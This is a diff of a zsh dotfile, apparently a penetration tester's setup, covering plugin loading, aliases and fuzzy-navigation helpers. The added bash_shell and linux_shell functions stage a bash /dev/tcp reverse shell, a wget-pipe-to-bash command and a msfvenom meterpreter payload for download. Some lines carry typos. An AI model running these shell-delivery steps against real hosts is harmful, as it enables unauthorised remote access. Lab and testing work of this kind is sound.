@@ -80,7 +80,6 @@ zinit light jeffreytse/zsh-vi-mode
 zinit ice id-as="cht"  mv="%ID% -> cht.sh" sbin="cht.sh" cloneonly
 zinit snippet https://cht.sh/:cht.sh
 
-# id-as='color-man-page'      "OMZ::plugins/colored-man-pages/colored-man-pages.plugin.zsh"\
 zinit  light-mode lucid wait="0"  for\
     id-as='fzf-tab'             "Aloxaf/fzf-tab" \
     id-as='syntax'              "zdharma/fast-syntax-highlighting" \
@@ -93,6 +92,7 @@ zinit  light-mode lucid wait="0"  for\
     id-as='httpie-completion'   as="completion" mv="%ID% -> _httpie" "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/httpie/_httpie"\
     id-as='cht_completion'      as="completion" mv="%ID% -> _cht"    "https://cheat.sh/:zsh"\
     id-as='gf_completion'       as="completion" mv="%ID% -> _gf"    "https://raw.githubusercontent.com/tomnomnom/gf/master/gf-completion.zsh"\
+    id-as='tmuxinator_completion'   as="completion" mv="%ID% -> _tmuxinator"    "https://raw.githubusercontent.com/tmuxinator/tmuxinator/master/completion/tmuxinator.zsh"\
     id-as='alias-tips'          "djui/alias-tips" \
     id-as='fzf-marks'           "urbainvaes/fzf-marks" \
     id-as='dotbare'             "kazhala/dotbare" \
@@ -100,7 +100,6 @@ zinit  light-mode lucid wait="0"  for\
     id-as='fz'                  "changyuheng/fz" \
     id-as='fzf-completion'      "https://raw.githubusercontent.com/junegunn/fzf/master/shell/completion.zsh "\
     id-as='alias-finder'        "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/alias-finder/alias-finder.plugin.zsh" \
-    id-as='zsh_src'             "OMZ::plugins/zsh_reload/zsh_reload.plugin.zsh"\
     id-as='clipbord'            "https://github.com/ohmyzsh/ohmyzsh/blob/master/lib/clipboard.zsh" \
     id-as='safe-paste'          "OMZ::plugins/safe-paste/safe-paste.plugin.zsh" \
     id-as='copyfile'            "OMZ::plugins/copyfile/copyfile.plugin.zsh"\
@@ -125,8 +124,12 @@ zinit snippet $(echo "${HOME}/.config/custom/eval.zsh")
 zinit ice lucid depth"1" wait="0" id-as="extract"
 zinit snippet OMZ::plugins/extract
 
+zinit ice lucid wait="0" id-as="bindkey"
+zinit snippet $(echo "${HOME}/.config/custom/bindkey.sh")
+
 zinit ice blockf lucid wait="0" atload='zpcompinit;zpcdreplay' atclone="zinit creinstall zsh-completions" id-as="zsh-completions" as="completion"
 zinit light zsh-users/zsh-completions
+
 
 zinit ice wait="1" lucid id-as="autopair"
 zinit light hlissner/zsh-autopair
@@ -169,8 +172,11 @@ zinit ice wait="1" lucid as="null" from="gh-r" id-as="neovim" mv="nvim* -> neovi
 zinit light neovim/neovim
 
 # acme.sh
-zinit ice wait="1" lucid as="null" id-as="acme" depth="1" fbin="acme.sh"
+zinit ice wait="1" lucid as="null" id-as="acme" depth="1" sbin="acme.sh"
 zinit light acmesh-official/acme.sh
+
+zinit ice wait="1" lucid as="bin" id-as="tmux-fzf" sbin="tmux-fzf"
+zinit snippet https://raw.githubusercontent.com/junegunn/fzf/master/bin/fzf-tmux
 
 # gron json 处理器
 zinit ice wait='1' lucid as="null" id-as="gron"  from="gh-r" sbin="gron"
@@ -180,6 +186,8 @@ zinit light tomnomnom/gron
 zinit ice wait="1" lucid as="null" id-as="ffuf" from="gh-r" sbin="ffuf"
 zinit light ffuf/ffuf
 #
+# bindkey 
+
 #https://github.com/tomnomnom/gf 
 # End of Zinit's installer chunk
 # }}}
@@ -211,19 +219,20 @@ export FZF_DEFAULT_OPTS="--ansi"
 export TZ='Asia/Shanghai'
 export DOTBARE_DIR="${HOME}/.myconfig"
 export DOTBARE_TREE="${HOME}"
-# export TERM=xterm-256color
-# export TERM=xterm
-export LOCAL_IP=$(ifconfig eth0 |  grep 'inet'|awk '{print $2}' | head -1)
-# export LOCAL_IP="127.0.0.1"
+export LOCAL_IP=$(ifconfig eth0 |  grep 'inet'|awk '{print $2}' | head -1) 
+if test -z "$LOCAL_IP";then
+    export LOCAL_IP=$(ifconfig eth1 |  grep 'inet'|awk '{print $2}' | head -1)
+fi
 export LISTEN_IP="0.0.0.0"
-export TARGET_IP="127.0.0.1"
-export TARGET_URL="http://127.0.0.1"
+export TARGET_IP=""
+export TARGET_URL=""
 export TARGET_HTTP_PORT="80"
-export TARGET_FQDN="www.baidu.com"
+export TARGET_HTTPS_PORT="443"
+export TARGET_FQDN=""
 export LOCAL_PORT="443"
-# export GOROOT="${HOME}/.local/go"
 export GOPATH="${HOME}/.local/go"
 export BIN="${HOME}/.local/bin"
+export TEMP=$(uuid | tr -d '-' | cut -c '1-8')
 
 
 if [ -x "$(command -v nvim)" ]; then
@@ -300,18 +309,19 @@ alias jbf='j -b -I'
 alias jh='j -I -t .'
 # jc 跳转到当前路径下的子目录
 alias gdh="git diff HEAD"
+alias vitmux="$EDITOR ${HOME}/.tmux.conf"
 alias gw="${HOME}/.local/go/bin/gf"
 alias cht="cht.sh"
 alias jc='j -c -I'
 alias fgrep='fgrep --color=auto'
+alias mux='tmuxinator'
 alias nmap='grc nmap'
 alias sqlmap='sqlmap --random-agent'
 alias egrep='egrep --color=auto'
 alias diff='diff --color=auto'
 alias ip='ip --color=auto'
 alias tsrc='tmux source ~/.tmux.conf'
-alias batcat='bat'
-alias gitc='/usr/bin/git --git-dir=$HOME/.myconfig/ --work-tree=$HOME'
+alias batcat='bat' alias gitc='/usr/bin/git --git-dir=$HOME/.myconfig/ --work-tree=$HOME'
 alias config='dotbare'
 alias zshconfig="${EDITOR} ~/.zshrc"
 alias vimconfig="${EDITOR} ~/.config/nvim/init.vim"
@@ -331,7 +341,7 @@ function ffufb(){
 }
  
 
-function cg (){
+function cdg (){
     repo=$(gita ls | tr ' ' '\n' | fzf)
     if test -n "$repo";then
         cd $(gita ls "$repo")
@@ -345,13 +355,21 @@ function cde(){
     fi
     dir=$(fd . --type=d --full-path "$dir" --color=always |fzf --preview 'exa --icons  {}')
     cd $dir
-   
 }
 function cdv() {
-    dir=$(fd . --type=d --full-path ${HOME}/vulnhub --color=always |fzf --preview 'exa --icons  {}')
+    dir=$(fd -d 1 . --type=d --full-path ${HOME}/vulnhub --color=always |fzf --preview 'exa --icons  {}')
     cd $dir
 }
-function pdict(){
+function cdh() {
+    dir=$(fd  . --type=d --full-path ${HOME}/vulnhub --color=always |fzf --preview 'exa --icons  {}')
+    cd $dir
+}
+function rmv() {
+    dir=$(fd -d 1  . --type=d --full-path ${HOME}/vulnhub --color=always |fzf --preview 'exa --icons  {}')
+    rm -fr  $dir
+}
+alias pdict=_pdict
+function _pdict(){
     fd . "${HOME}/dict" | fzf | clipcopy
 }
 function ef(){
@@ -365,11 +383,45 @@ function ef(){
         $EDITOR $file
     fi
 }
-get_tmux(){
+fucntion get_tmux(){
     name=$(tmux ls | cut -d '-' -f 1|fzf)
     tmux a -t $name
 }
+function bash_shell(){
+    echo "bash -i >& /dev/tcp/$LOCAL_IP/443 0>&1" > /tmp/temp
+    echo "wget -O -  http://$LOCAL_IP:8080/temp | bash" | clipcopy
+    cd /tmp
+    python3 -m http.server 8080
+}
+function linux_shell(){
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=443 --platform linux -f elf -o /tmp/temp
+    cd /tmp
+    echo "wget http://$LOCAL_IP:8080/temp"
+    python3 -m http.server 8080
+}
 function ssht () {/usr/bin/ssh -t "$@" "tmux attach -s 'master' || tmux new -t 'master' ";}
+function src() {
+	local cache="$ZSH_CACHE_DIR"
+	autoload -U compinit zrecompile
+	compinit -i -d "$cache/zcomp-$HOST"
+
+	for f in ${ZDOTDIR:-~}/.zshrc "$cache/zcomp-$HOST"; do
+		zrecompile -p $f && command rm -f $f.zwc.old
+	done
+
+	# Use $SHELL if it's available and a zsh shell
+	local shell="$ZSH_ARGZERO"
+	if [[ "${${SHELL:t}#-}" = zsh ]]; then
+		shell="$SHELL"
+	fi
+
+	# Remove leading dash if login shell and run accordingly
+	if [[ "${shell:0:1}" = "-" ]]; then
+		exec -l "${shell#-}"
+	else
+		exec "$shell"
+	fi
+}
 zinit ice id-as="p10k.zsh"
 zinit snippet $(echo ${HOME}/.p10k.zsh)
 #}}} 
@@ -386,4 +438,3 @@ if test "$?" -eq 0;then
    alias ssh="ssh.exe"
 fi
 # }}}
-
